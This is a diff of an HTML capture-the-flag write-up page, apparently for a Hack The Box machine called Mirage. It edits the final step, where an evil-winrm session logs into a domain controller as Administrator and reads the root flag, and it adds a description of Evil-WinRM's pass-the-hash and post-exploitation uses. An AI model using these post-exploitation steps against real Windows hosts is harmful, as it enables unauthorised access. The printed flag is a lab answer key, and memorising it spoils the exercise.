@@ -826,29 +516,25 @@ Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its a
 
 ┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ evil-winrm -i dc01.mirage.htb -r mirage.htb</code></pre></div>
-      <p>As you can see, I am now logged in as administrator and we can proceed to obtain the root flag.</p>
-      <div class="flag-box">
-  <span class="flag-label">🚩 Root Flag</span>
-  <code class="flag-value">eab21331876244aec534137ec32dd24f</code>
-</div>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
 *Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls
 
 
- Directory: C:\Users\Administrator\Desktop
+    Directory: C:\Users\Administrator\Desktop
 
 
-Mode LastWriteTime Length Name
----- ------------- ------ ----
--ar--- 7/23/2025 7:08 PM 34 root.txt
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         7/23/2025   7:08 PM             34 root.txt
 
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
 eab21331876244aec534137ec32dd24f</code></pre></div>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250725094924.png" alt="Pasted image 20250725094924.png" loading="lazy" /><span class="img-caption">Pasted image 20250725094924.png</span></div>
+      <div class="flag-box"><span class="flag-label">🚩 Root Flag</span><code class="flag-value">eab21331876244aec534137ec32dd24f</code></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250725094924.png" alt="Machine rooted as Administrator" loading="lazy" /><span class="img-caption">Machine rooted as Administrator</span></div>
     </div>
   </div>
-
   <script type="text/javascript" src="/bundle.min.js"></script>
 </body>
 </html>
